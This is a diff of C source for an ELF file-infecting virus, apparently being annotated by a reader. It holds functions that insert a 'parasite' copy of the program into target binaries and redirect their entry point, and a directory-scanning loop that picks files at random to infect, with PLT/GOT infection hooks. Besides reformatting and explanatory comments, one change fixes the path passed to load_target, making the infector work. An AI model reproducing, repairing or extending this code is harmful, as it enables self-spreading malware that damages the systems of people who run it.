@@ -410,18 +410,18 @@ Elf64_Addr infect_elf_file(elfbin_t *self, elfbin_t *target)
 	uint8_t *mem;
 	int fd;
 	int text_found = 0, i;
-        Elf64_Addr orig_entry_point;
-        Elf64_Addr origText;
+	Elf64_Addr orig_entry_point;
+	Elf64_Addr origText;
 	Elf64_Addr new_base;
 	size_t parasiteSize;
 	size_t paddingSize;
 	struct stat st;
-	char *host = target->path;
+	char *host = target->path; //PER: Path of target file
 	long o_entry_offset;
 	/*
 	 * Get size of parasite (self)
 	 */
-        parasiteSize = self->size;
+	parasiteSize = self->size;
 	paddingSize = PAGE_ALIGN_UP(parasiteSize);
 	
 	mem = target->mem;
@@ -530,23 +530,22 @@ int load_target(const char *path, elfbin_t *elf)
 		switch(elf->phdr[i].p_type) {	
 			case PT_LOAD:
 				switch(!!elf->phdr[i].p_offset) {
-                        	case 0:
-                                	elf->textVaddr = elf->phdr[i].p_vaddr;
-                                	elf->textSize = elf->phdr[i].p_memsz;
-                                	break;
-                               	case 1:
-                                	elf->dataVaddr = elf->phdr[i].p_vaddr;
-                                	elf->dataSize = elf->phdr[i].p_memsz;
-                                	elf->dataOff = elf->phdr[i].p_offset;
-					break;
-                        }
+					case 0:
+						elf->textVaddr = elf->phdr[i].p_vaddr;
+						elf->textSize = elf->phdr[i].p_memsz;
+						break;
+					case 1:
+						elf->dataVaddr = elf->phdr[i].p_vaddr;
+						elf->dataSize = elf->phdr[i].p_memsz;
+						elf->dataOff = elf->phdr[i].p_offset;
+						break;
+                }
 				break;
 			case PT_DYNAMIC:
 				elf->dyn = (Elf64_Dyn *)&elf->mem[elf->phdr[i].p_offset];
 				break;
-		}
-			
-        }
+		}	
+    }
 	elf->st = st;
 	elf->size = st.st_size;
 	return 0;
@@ -792,7 +791,7 @@ rescan:
 				continue;
 			if (d->d_name[0] == '.')
 				continue;
-			// PER: fpath contains the address that point to {[dir]+[d->d_name]+[memory allocated my malloc]} 
+			// PER: fpath contains the address that point to {[dir]+['/']+[d->d_name]+[NULL]+[memory allocated my malloc]} 
 			// PER: all in the heap section of the process memory that is called by the full_path function.
 			
 			// PER: checking criteria
@@ -807,7 +806,7 @@ rescan:
                         if (rnum != LUCKY_NUMBER) //PER: 9/10 probability that rnum is not the LUCKY_NUMBER
                                 continue;
 infect:
-			load_target(&fpath[_strlen(dir) + 1], &target);
+			load_target(fpath, &target);
 			new_base = infect_elf_file(&self, &target);
 			unload_target(&target);
 #ifdef INFECT_PLTGOT
